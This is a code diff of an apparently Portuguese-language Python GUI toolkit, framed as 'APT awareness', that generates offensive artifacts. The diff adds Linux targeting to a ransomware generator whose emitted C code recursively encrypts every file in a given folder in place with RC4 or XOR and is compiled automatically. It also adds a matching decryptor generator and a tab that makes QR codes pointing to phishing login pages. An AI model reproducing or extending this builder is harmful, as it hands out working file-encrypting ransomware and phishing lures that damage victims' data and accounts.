@@ -2,7 +2,8 @@ from PySide2.QtWidgets import (
     QApplication, QMainWindow, QWidget, QTabWidget, QVBoxLayout, QLabel,
     QComboBox, QPushButton, QLineEdit, QTextEdit, QMessageBox, QCheckBox, QFileDialog
 )
-
+from PySide2.QtGui import QPixmap
+from PySide2.QtWidgets import QLabel
 from PySide2.QtGui import QPalette, QColor
 from PySide2.QtCore import Qt
 from PySide2.QtCore import QTimer
@@ -19,7 +20,7 @@ class DarkThemeApp(QMainWindow):
         super().__init__()
         self.face_image_path = ""
         self.target_video_path = ""
-        self.setWindowTitle("ShadowPhish - APT Awareness Toolkit")
+        self.setWindowTitle("APT Awareness Toolkit")
         self.setGeometry(100, 100, 1000, 700)
 
         self.tabs = QTabWidget()
@@ -38,6 +39,8 @@ class DarkThemeApp(QMainWindow):
         self.lnk_tab = QWidget()
         self.htmlsm_tab = QWidget()
         self.ransomware_tab = QWidget()
+        self.decryptor_tab = QWidget()
+        self.qrcode_tab = QWidget()
 
         self.tabs.addTab(self.artifacts_tab, "Gerar Artefatos Maliciosos")
         self.tabs.addTab(self.phishing_tab, "Phishing & Spear-Phishing")
@@ -47,6 +50,8 @@ class DarkThemeApp(QMainWindow):
         self.tabs.addTab(self.apt_tab, "Templates APT")
         self.tabs.addTab(self.htmlsm_tab, "HTML Smuggling")
         self.tabs.addTab(self.ransomware_tab, "Simulador de Ransomware")
+        self.tabs.addTab(self.decryptor_tab, "Descriptografar Ransomware")
+        self.tabs.addTab(self.qrcode_tab, "Phishing via QR Code")
 
 
         # --- Aba Gerar Artefatos Maliciosos ---
@@ -413,38 +418,85 @@ class DarkThemeApp(QMainWindow):
         self.ransomware_name_input.setPlaceholderText("Ex: SimRansom")
         ransom_layout.addWidget(self.ransomware_name_input)
 
-        ransom_layout.addWidget(QLabel("Chave AES-256 (texto livre, será convertida):"))
+        ransom_layout.addWidget(QLabel("Chave (texto livre, usada para RC4/XOR):"))
         self.ransomware_key_input = QLineEdit()
-        self.ransomware_key_input.setPlaceholderText("Ex: minhaSuperChave123")
+        self.ransomware_key_input.setPlaceholderText("Ex: SegredoTop123")
         ransom_layout.addWidget(self.ransomware_key_input)
 
-        ransom_layout.addWidget(QLabel("IV (hexadecimal, 32 caracteres — opcional):"))
-        self.ransomware_iv_input = QLineEdit()
-        self.ransomware_iv_input.setPlaceholderText("Ex: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6")
-        ransom_layout.addWidget(self.ransomware_iv_input)
-
-        ransom_layout.addWidget(QLabel("Cifra a ser usada:"))
+        ransom_layout.addWidget(QLabel("Cifra para simulação:"))
         self.ransomware_cipher_selector = QComboBox()
         self.ransomware_cipher_selector.addItems(["RC4", "XOR"])
         ransom_layout.addWidget(self.ransomware_cipher_selector)
 
-        ransom_layout.addWidget(QLabel("Sistema Operacional (compilação):"))
+        ransom_layout.addWidget(QLabel("Sistema Operacional Alvo (onde o ransomware será executado):"))
         self.ransomware_os_selector = QComboBox()
-        self.ransomware_os_selector.addItems(["Windows"])  # futuros: Linux, macOS
+        self.ransomware_os_selector.addItems(["Windows", "Linux"])
         ransom_layout.addWidget(self.ransomware_os_selector)
 
         self.ransomware_generate_btn = QPushButton("Gerar Simulador de Ransomware")
         self.ransomware_generate_btn.clicked.connect(self.generate_sim_ransomware)
         ransom_layout.addWidget(self.ransomware_generate_btn)
 
-        # ⬅️ Label de status da ação
-        self.ransom_status = QLabel("Status: Aguardando ação...")
+        self.ransom_status = QLabel("Status: Aguardando geração...")
         ransom_layout.addWidget(self.ransom_status)
 
         self.ransomware_tab.setLayout(ransom_layout)
 
 
+        # --- Aba Decryptor de Ransomware ---
+        decrypt_layout = QVBoxLayout()
 
+        decrypt_layout.addWidget(QLabel("Nome do Decryptor:"))
+        self.decryptor_name_input = QLineEdit()
+        decrypt_layout.addWidget(self.decryptor_name_input)
+
+        decrypt_layout.addWidget(QLabel("Chave usada no ataque (mesma do ransomware):"))
+        self.decryptor_key_input = QLineEdit()
+        self.decryptor_key_input.setPlaceholderText("Ex: SegredoTop123")
+        decrypt_layout.addWidget(self.decryptor_key_input)
+
+        decrypt_layout.addWidget(QLabel("Cifra usada:"))
+        self.decryptor_cipher_selector = QComboBox()
+        self.decryptor_cipher_selector.addItems(["RC4", "XOR"])
+        decrypt_layout.addWidget(self.decryptor_cipher_selector)
+
+        decrypt_layout.addWidget(QLabel("Sistema Operacional Alvo (para compilar o decryptor):"))
+        self.decryptor_os_selector = QComboBox()
+        self.decryptor_os_selector.addItems(["Windows", "Linux"])
+        decrypt_layout.addWidget(self.decryptor_os_selector)
+
+        self.decryptor_generate_btn = QPushButton("Gerar Decryptor")
+        self.decryptor_generate_btn.clicked.connect(self.generate_sim_decryptor)
+        decrypt_layout.addWidget(self.decryptor_generate_btn)
+
+        self.decryptor_status = QLabel("Status: Aguardando geração...")
+        decrypt_layout.addWidget(self.decryptor_status)
+
+        self.decryptor_tab.setLayout(decrypt_layout)
+
+
+        # QRCODE PHISHING
+        qr_layout = QVBoxLayout()
+
+        qr_layout.addWidget(QLabel("URL de destino (página de phishing):"))
+        self.qr_url_input = QLineEdit()
+        self.qr_url_input.setPlaceholderText("Ex: http://192.168.0.5:8080/login")
+        qr_layout.addWidget(self.qr_url_input)
+
+        self.qr_generate_btn = QPushButton("Gerar QR Code")
+        self.qr_generate_btn.clicked.connect(self.generate_phishing_qrcode)
+        qr_layout.addWidget(self.qr_generate_btn)
+
+        self.qr_image_label = QLabel()
+        self.qr_image_label.setAlignment(Qt.AlignCenter)
+        qr_layout.addWidget(self.qr_image_label)
+
+        self.qr_save_btn = QPushButton("Salvar QR Code como PNG")
+        self.qr_save_btn.setEnabled(False)
+        self.qr_save_btn.clicked.connect(self.save_qrcode_image)
+        qr_layout.addWidget(self.qr_save_btn)
+
+        self.qrcode_tab.setLayout(qr_layout)
 
     def set_dark_theme(self):
         palette = QPalette()
@@ -1447,6 +1499,7 @@ End If
         name = self.ransomware_name_input.text().strip() or "SimRansom"
         key_text = self.ransomware_key_input.text().strip()
         cipher_type = self.ransomware_cipher_selector.currentText()
+        target_os = self.ransomware_os_selector.currentText()  # "Linux" ou "Windows"
 
         if not key_text:
             QMessageBox.warning(self, "Erro", "Digite uma chave (ex: SegredoTop123).")
@@ -1458,10 +1511,15 @@ End If
 
         os.makedirs("sim_ransomware", exist_ok=True)
 
-        encryptor_path = f"sim_ransomware/{name}_encryptor.c"
-        decryptor_path = f"sim_ransomware/{name}_decryptor.c"
-        exe_path = f"sim_ransomware/{name}.exe"
+        encryptor_path = f"sim_ransomware/{name}_encryptor_{target_os.lower()}.c"
+        decryptor_path = f"sim_ransomware/{name}_decryptor_{target_os.lower()}.c"
+        exe_ext = ".exe" if target_os == "Windows" else ""
+        exe_path = f"sim_ransomware/{name}_{target_os.lower()}{exe_ext}"
 
+        # Caminho e separador
+        path_sep = "\\" if target_os == "Windows" else "/"
+
+        # Cifra
         if cipher_type == "RC4":
             cipher_func = f"""
     void rc4(unsigned char* data, int len, unsigned char* key, int klen) {{
@@ -1471,18 +1529,14 @@ End If
         int j = 0;
         for (int i = 0; i < 256; i++) {{
             j = (j + S[i] + key[i % klen]) % 256;
-            unsigned char tmp = S[i];
-            S[i] = S[j];
-            S[j] = tmp;
+            unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
         }}
 
         int i = 0; j = 0;
         for (int n = 0; n < len; n++) {{
             i = (i + 1) % 256;
             j = (j + S[i]) % 256;
-            unsigned char tmp = S[i];
-            S[i] = S[j];
-            S[j] = tmp;
+            unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
             data[n] ^= S[(S[i] + S[j]) % 256];
         }}
     }}
@@ -1499,6 +1553,7 @@ End If
     """
             crypto_call = "xor_cipher(buffer, len, key, key_len);"
 
+        # Código base adaptado
         base_code = f'''#define _CRT_SECURE_NO_WARNINGS
     #include <stdio.h>
     #include <stdlib.h>
@@ -1538,11 +1593,153 @@ End If
         while ((entry = readdir(dp))) {{
             if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
             char fullpath[1024];
-            snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);
+            snprintf(fullpath, sizeof(fullpath), "%s{path_sep}%s", path, entry->d_name);
 
             struct stat st;
-            stat(fullpath, &st);
-            if (S_ISDIR(st.st_mode)) {{
+            if (stat(fullpath, &st) == 0 && S_ISDIR(st.st_mode)) {{
+                walk(fullpath);
+            }} else {{
+                process_file(fullpath);
+            }}
+        }}
+        closedir(dp);
+    }}
+
+    int main(int argc, char* argv[]) {{
+        if (argc != 2) {{
+            printf("Uso: %s <pasta>\\n", argv[0]);
+            return 1;
+        }}
+        walk(argv[1]);
+        return 0;
+    }}'''
+
+        # Salvar arquivos
+        with open(encryptor_path, "w") as f:
+            f.write(base_code)
+
+        with open(decryptor_path, "w") as f:
+            f.write(f"// DECRYPTOR {name} - Plataforma: {target_os} - Chave: {key_text}\n")
+            f.write(base_code)
+
+        # Compilar se possível
+        if target_os == "Windows":
+            compiler = "x86_64-w64-mingw32-gcc"
+        else:
+            compiler = "gcc"
+
+        compile_cmd = f"{compiler} {encryptor_path} -o {exe_path}"
+
+        try:
+            result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
+            if result.returncode == 0:
+                QMessageBox.information(self, "Sucesso", f"✅ Ransomware {target_os} gerado com sucesso em:\n{exe_path}")
+            else:
+                QMessageBox.warning(self, "Aviso", f"⚠️ Código fonte gerado, mas erro ao compilar:\n{result.stderr}")
+        except Exception as e:
+            QMessageBox.warning(self, "Erro", f"Erro na compilação: {str(e)}")
+
+
+    def generate_sim_decryptor(self):
+        import os
+        import subprocess
+        from PySide2.QtWidgets import QMessageBox
+
+        name = self.decryptor_name_input.text().strip() or "SimRansom"
+        key_text = self.decryptor_key_input.text().strip()
+        cipher_type = self.decryptor_cipher_selector.currentText()
+        os_target = self.decryptor_os_selector.currentText()  # Windows ou Linux
+
+        if not key_text:
+            QMessageBox.warning(self, "Erro", "Digite a chave usada no ransomware (texto simples).")
+            return
+
+        key = key_text.encode("utf-8")
+        key_len = len(key)
+        key_array = ', '.join(str(b) for b in key)
+
+        os.makedirs("sim_ransomware", exist_ok=True)
+        decryptor_path = f"sim_ransomware/{name}_decryptor_{os_target.lower()}.c"
+        exe_path = f"sim_ransomware/{name}_decryptor_{os_target.lower()}.exe" if os_target == "Windows" else f"sim_ransomware/{name}_decryptor_{os_target.lower()}"
+
+        sep = "\\" if os_target == "Windows" else "/"
+
+        # Cipher logic
+        if cipher_type == "RC4":
+            cipher_func = f"""
+    void rc4(unsigned char* data, int len, unsigned char* key, int klen) {{
+        unsigned char S[256];
+        for (int i = 0; i < 256; i++) S[i] = i;
+
+        int j = 0;
+        for (int i = 0; i < 256; i++) {{
+            j = (j + S[i] + key[i % klen]) % 256;
+            unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
+        }}
+
+        int i = 0; j = 0;
+        for (int n = 0; n < len; n++) {{
+            i = (i + 1) % 256;
+            j = (j + S[i]) % 256;
+            unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
+            data[n] ^= S[(S[i] + S[j]) % 256];
+        }}
+    }}
+    """
+            crypto_call = "rc4(buffer, len, key, key_len);"
+        else:  # XOR
+            cipher_func = f"""
+    void xor_cipher(unsigned char* data, int len, unsigned char* key, int klen) {{
+        for (int i = 0; i < len; i++) {{
+            data[i] ^= key[i % klen];
+        }}
+    }}
+    """
+            crypto_call = "xor_cipher(buffer, len, key, key_len);"
+
+        code = f'''#define _CRT_SECURE_NO_WARNINGS
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <dirent.h>
+    #include <sys/stat.h>
+
+    unsigned char key[] = {{{key_array}}};
+    int key_len = {key_len};
+
+    {cipher_func}
+
+    void process_file(const char* filepath) {{
+        FILE* f = fopen(filepath, "rb");
+        if (!f) return;
+        fseek(f, 0, SEEK_END);
+        long len = ftell(f);
+        rewind(f);
+
+        unsigned char* buffer = malloc(len);
+        fread(buffer, 1, len, f);
+        fclose(f);
+
+        {crypto_call}
+
+        FILE* out = fopen(filepath, "wb");
+        fwrite(buffer, 1, len, out);
+        fclose(out);
+        free(buffer);
+    }}
+
+    void walk(const char* path) {{
+        struct dirent* entry;
+        DIR* dp = opendir(path);
+        if (!dp) return;
+
+        while ((entry = readdir(dp))) {{
+            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
+            char fullpath[1024];
+            snprintf(fullpath, sizeof(fullpath), "%s{sep}%s", path, entry->d_name);
+
+            struct stat st;
+            if (stat(fullpath, &st) == 0 && S_ISDIR(st.st_mode)) {{
                 walk(fullpath);
             }} else {{
                 process_file(fullpath);
@@ -1561,23 +1758,69 @@ End If
     }}
     '''
 
-        with open(encryptor_path, "w") as f:
-            f.write(base_code)
-
         with open(decryptor_path, "w") as f:
-            f.write("// Mesmo código do encryptor (criptografia simétrica)\n")
-            f.write(base_code)
+            f.write(code)
 
-        compile_cmd = f"x86_64-w64-mingw32-gcc {encryptor_path} -o {exe_path}"
+        compiler = "x86_64-w64-mingw32-gcc" if os_target == "Windows" else "gcc"
+        compile_cmd = f"{compiler} {decryptor_path} -o {exe_path}"
+
         try:
             result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
             if result.returncode == 0:
-                QMessageBox.information(self, "Sucesso", f"✅ Simulador gerado: {exe_path}\n\nCifra: {cipher_type}\nChave usada: {key_text}")
+                QMessageBox.information(self, "Sucesso", f"✅ Decryptor {os_target} gerado: {exe_path}")
             else:
-                QMessageBox.critical(self, "Erro", f"Erro na compilação:\n{result.stderr}")
+                QMessageBox.warning(self, "Aviso", f"⚠️ Código criado, mas erro ao compilar:\n{result.stderr}")
         except Exception as e:
-            QMessageBox.critical(self, "Erro", f"Erro ao compilar:\n{str(e)}")
+            QMessageBox.critical(self, "Erro", f"Erro na compilação: {str(e)}")
 
+
+    def generate_phishing_qrcode(self):
+        import qrcode
+        from PySide2.QtGui import QImage, QPixmap
+        from io import BytesIO
+
+        url = self.qr_url_input.text().strip()
+        if not url:
+            QMessageBox.warning(self, "Erro", "Digite a URL de destino.")
+            return
+
+        try:
+            qr = qrcode.QRCode(
+                version=1,
+                error_correction=qrcode.constants.ERROR_CORRECT_L,
+                box_size=8,
+                border=4,
+            )
+            qr.add_data(url)
+            qr.make(fit=True)
+
+            img = qr.make_image(fill_color="black", back_color="white").convert("RGB")
+            buffer = BytesIO()
+            img.save(buffer, format="PNG")
+            qt_img = QImage.fromData(buffer.getvalue())
+            pixmap = QPixmap.fromImage(qt_img)
+
+            self.qr_img_data = img  # armazena a imagem PIL para salvar depois
+            self.qr_image_label.setPixmap(pixmap)
+            self.qr_save_btn.setEnabled(True)
+
+        except Exception as e:
+            QMessageBox.critical(self, "Erro", f"Erro ao gerar QR Code:\n{str(e)}")
+
+
+
+    def save_qrcode_image(self):
+        if hasattr(self, "qr_img_data"):
+            from PySide2.QtWidgets import QFileDialog
+            path, _ = QFileDialog.getSaveFileName(self, "Salvar QR Code", "phish_qrcode.png", "PNG (*.png)")
+            if path:
+                try:
+                    self.qr_img_data.save(path)
+                    QMessageBox.information(self, "Salvo", f"QR Code salvo com sucesso em:\n{path}")
+                except Exception as e:
+                    QMessageBox.critical(self, "Erro", f"Erro ao salvar:\n{str(e)}")
+        else:
+            QMessageBox.warning(self, "Erro", "Nenhum QR Code gerado ainda.")
 
 
 import asyncio
